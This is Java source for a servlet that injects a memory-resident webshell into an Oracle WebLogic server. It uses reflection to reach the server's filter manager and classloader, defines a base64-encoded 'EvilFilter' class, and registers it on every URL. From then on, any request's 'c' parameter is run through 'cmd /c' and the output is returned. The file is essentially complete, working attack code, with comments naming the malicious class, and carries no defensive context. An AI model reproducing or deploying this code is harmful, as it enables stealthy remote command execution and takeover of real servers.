package Servlet_regtest;

import sun.misc.BASE64Decoder;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;


@WebServlet("/filter_reg")
public class Servlet_Filter_reg implements  Servlet {


    public void init(ServletConfig servletConfig) throws ServletException {

    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {



        try {
            Class executeThread = Class.forName("weblogic.work.ExecuteThread");
            Method m = executeThread.getDeclaredMethod("getCurrentWork");
            Object currentWork = m.invoke(Thread.currentThread());


            Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
            connectionHandlerF.setAccessible(true);
            Object obj = connectionHandlerF.get(currentWork);


            Field requestF = obj.getClass().getDeclaredField("request");
            requestF.setAccessible(true);
            obj = requestF.get(obj);


            Field contextF = obj.getClass().getDeclaredField("context");
            contextF.setAccessible(true);
            Object context = contextF.get(obj);
            Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
            Object filterManager = getFilterManagerM.invoke(context);
            Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
// String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
            registerFilterM.setAccessible(true);


            Field classLoaderF = context.getClass().getDeclaredField("classLoader");
            classLoaderF.setAccessible(true);
            ClassLoader cl = (ClassLoader) classLoaderF.get(context);


            Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
            cachedClassesF.setAccessible(true);
            Object cachedClass = cachedClassesF.get(cl);


            Method getM = cachedClass.getClass().getDeclaredMethod("get", Object.class);
            if (getM.invoke(cachedClass, "Myfilter") == null) {
//                byte[] Uclassbate = new byte[] {};

                String encode_class ="yv66vgAAADIAmgoAHgBNCQBOAE8IAFAKAFEAUggAUwcAVAgAVQsABgBWBwBXCABYCgAJAFkKAAkAWgoAWwBcCgAJAF0KAFsAXgoAXwBgBwBhCgARAGIIAGMKABEAZAoAEQBlCgARAGYIAGcLAGgAaQoAagBrCgBqAGwLAG0AbggAbwcAcAcAcQcAcgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAUTEZpbHRlcnMvRXZpbEZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwBzAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHY29tbWFuZAEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAB3NjYW5uZXIBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQANU3RhY2tNYXBUYWJsZQcAcAcAdAcAdQcAdgcAVAcAVwcAdwcAYQcAeAcAeQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAPRXZpbEZpbHRlci5qYXZhDAAgACEHAHoMAHsAfAEAEmV2aWwgRmlsdGVyIOWIm+W7ugcAfQwAfgB/AQAeZXZpbCBmaWx0ZXIg5omn6KGM6L+H5ruk6L+H56iLAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAAWMMAIAAgQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAHY21kIC9jIAwAIAB/DACCAIMHAIQMAIUAhgwAhwCIDACJAIoHAIsMAIwAjQEAEWphdmEvdXRpbC9TY2FubmVyDAAgAI4BAAJcYQwAjwCQDACRAJIMAJMAiAEAAAcAdQwAlACVBwCWDACXAH8MAJgAIQcAdgwALQCZAQAVZXZpbCBmaWx0ZXIg6ZSA5q+B77yBAQASRmlsdGVycy9FdmlsRmlsdGVyAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAFZmx1c2gBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAHQAeAAEAHwAAAAQAAQAgACEAAQAiAAAALwABAAEAAAAFKrcAAbEAAAACACMAAAAGAAEAAAANACQAAAAMAAEAAAAFACUAJgAAAAEAJwAoAAIAIgAAAEEAAgACAAAACbIAAhIDtgAEsQAAAAIAIwAAAAoAAgAAABAACAARACQAAAAWAAIAAAAJACUAJgAAAAAACQApACoAAQArAAAABAABACwAAQAtAC4AAgAiAAABXgADAAkAAACGsgACEgW2AAQrwAAGOgQZBBIHuQAIAgDGAGa7AAlZEgq3AAs6BRkFGQQSB7kACAIAtgAMV7gADRkFtgAOtgAPtgAQOga7ABFZGQa3ABISE7YAFDoHGQe2ABWZAAsZB7YAFqcABRIXOggsuQAYAQAZCLYAGSy5ABgBALYAGrEtKyy5ABsDALEAAAADACMAAAA2AA0AAAAVAAgAFwAOABgAGgAZACUAGgA0ABsARAAcAFQAHQBoAB4AcwAfAHwAIAB9ACMAhQAkACQAAABcAAkAJQBYAC8AMAAFAEQAOQAxADIABgBUACkAMwA0AAcAaAAVADUANgAIAAAAhgAlACYAAAAAAIYANwA4AAEAAACGADkAOgACAAAAhgA7ADwAAwAOAHgAPQA+AAQAPwAAACgAA/8AZAAIBwBABwBBBwBCBwBDBwBEBwBFBwBGBwBHAABBBwBI+AAWACsAAAAGAAIASQAsAAEASgAhAAEAIgAAADcAAgABAAAACbIAAhIctgAEsQAAAAIAIwAAAAoAAgAAACgACAApACQAAAAMAAEAAAAJACUAJgAAAAEASwAAAAIATA==";
                byte[] Uclassbate = new BASE64Decoder().decodeBuffer(encode_class);

                Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class evilFilterClass = (Class) defineClass.invoke(cl, Uclassbate, 0, Uclassbate.length);


// 恶意类名称为 Myfilter  filter 名称为filtername
                Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
                putM.invoke(cachedClass, "Myfilter", evilFilterClass);
            }
            registerFilterM.invoke(filterManager, "filtername", "Myfilter", new String[]{"/*"}, null, null, null);
        } catch (Exception e) {
            e.printStackTrace();
        }


        servletResponse.getWriter().write("evil filter injected");








    }

        public String getServletInfo() {
        return null;
    }

    public void destroy() {

    }

}

